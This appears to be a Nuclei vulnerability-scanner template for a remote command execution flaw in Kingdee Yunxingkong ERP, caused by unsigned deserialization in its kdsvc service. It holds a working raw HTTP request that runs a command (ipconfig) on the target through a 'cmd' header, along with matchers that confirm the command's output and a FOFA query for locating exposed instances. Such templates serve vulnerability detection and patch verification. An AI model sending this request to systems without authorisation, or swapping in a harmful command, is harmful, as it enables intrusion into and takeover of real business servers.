id: kingdee-erp-rce

info:
  name: Kingdee OA Yunxingkong kdsvc - Remote Code Execution
  author: SleepingBag945
  severity: critical
  description: |
    Kingdee OA Yunxingkong has a remote command execution vulnerability. This vulnerability is caused by the fact that the communication layer of Kingdee Cloud Starry Sky Management Center adopts binary data format by default, which requires serialization and deserialization. No signature or verification is performed during this communication process, leading to malicious exploitation.
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20%E4%BA%91%E6%98%9F%E7%A9%BA%20kdsvc%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="金蝶云星空-管理中心"
  tags: kingdee-erp,rce,intrusive

http:
  - raw:
      - |
        POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1
        Host: {{Hostname}}
        cmd: ipconfig
        Content-Type: text/json

        {"ap0":"","format":"3"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Windows IP"
          - "Kingdee.BOS.Core.Metadata.BusinessInfo"
        condition: and

      - type: status
        status:
          - 200
